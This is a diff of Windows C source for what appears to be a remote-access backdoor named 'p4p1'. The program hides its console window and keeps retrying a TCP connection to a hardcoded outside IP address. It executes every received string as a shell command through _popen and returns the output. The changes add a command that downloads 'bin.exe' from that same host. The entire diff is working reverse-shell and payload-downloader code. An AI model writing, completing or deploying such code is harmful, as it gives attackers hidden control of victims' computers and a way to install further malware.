@@ -2,12 +2,13 @@
 
 int main(int argc, char * argv[])
 {
-	FreeConsole();
+	if(argc == 1)
+		FreeConsole();
 
 	int portno;
 	char portchar[6];
 	FILE * fp = fopen("p4p1_port.cfg", "r");
-
+	
 	if(fp == NULL){
 		portno = 4441;
 	} else {
@@ -31,7 +32,7 @@ int main(int argc, char * argv[])
 		/* socket */
 		SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 		if(s == INVALID_SOCKET){
-			fprintf(stderr, "Client : socket() - Error at socket(): %ld\n",
+			fprintf(stderr, "Client : socket() - Error at socket(): %i\n",
 			WSAGetLastError());
 			WSACleanup();
 			return -1;
@@ -47,7 +48,7 @@ int main(int argc, char * argv[])
 
 		bytesSent = 0;
 		bytesRecv = SOCKET_ERROR;
-
+	
 		struct sockaddr_in client;
 		client.sin_family = AF_INET;
 		client.sin_addr.s_addr = inet_addr(xstr(86.247.192.29));
@@ -57,16 +58,16 @@ int main(int argc, char * argv[])
 		int * pbs = &bytesSent;
 		int * pbr = &bytesRecv;
 
-
+		
 		do{
 			cn = connect(s, (SOCKADDR*) &client, sizeof(client));
 		} while( cn == SOCKET_ERROR);
 
-		while(1){
+		while(cn != SOCKET_ERROR){
 			/*send & recv*/
 			*pbs = send(s, prompt, sizeof(prompt), 0);
 	                if(*pbs == SOCKET_ERROR) { //server disconnected!
-	                        cn == SOCKET_ERROR;
+	                        
 	                        if(WSAGetLastError() != WSAECONNREFUSED
 	                        || WSAGetLastError() == WSAECONNRESET){
 					break;
@@ -87,8 +88,19 @@ int main(int argc, char * argv[])
 					return -1;
 				} else {
 					/*process received data*/
-					if(iscommand(buf[0])){
-						//process the custom p4p1 command.
+					if(iscommand(buf[0]) == 1 || iscommand(buf[0]) == 2){
+						if(iscommand(buf[0]) == 2){	// custom p4p1 commadn
+							memset(buf, 0, BUFSIZE);
+							goto close;
+						} else if (iscommand(buf[0]) == 1) {
+							memset(buf, 0, BUFSIZE);
+							download();
+							strcpy(buf, "file downloaded from 86.247.192.29 / bin.exe\n");
+						} else {
+							memset(buf, 0, BUFSIZE);
+							strcpy(buf, "Command non recognized.\n");
+						}
+
 					} else {
 						if( (pPipe = _popen( buf, "r" )) == NULL ){
 							memset(buf, 0, BUFSIZE);
@@ -105,11 +117,10 @@ int main(int argc, char * argv[])
 						}
 					}
 				}
-			}
+			}		
 
 			*pbs = send(s, buf, BUFSIZE, 0);
 			if(*pbs == SOCKET_ERROR) { //server disconnected!
-				cn == SOCKET_ERROR;
 				if(WSAGetLastError() != WSAECONNREFUSED
 				|| WSAGetLastError() == WSAECONNRESET){
 					break;
@@ -120,7 +131,7 @@ int main(int argc, char * argv[])
 			}
 			*pbr = SOCKET_ERROR;
 		}
-
+		close:
 		WSACleanup();
 		_pclose(pPipe);
 	}
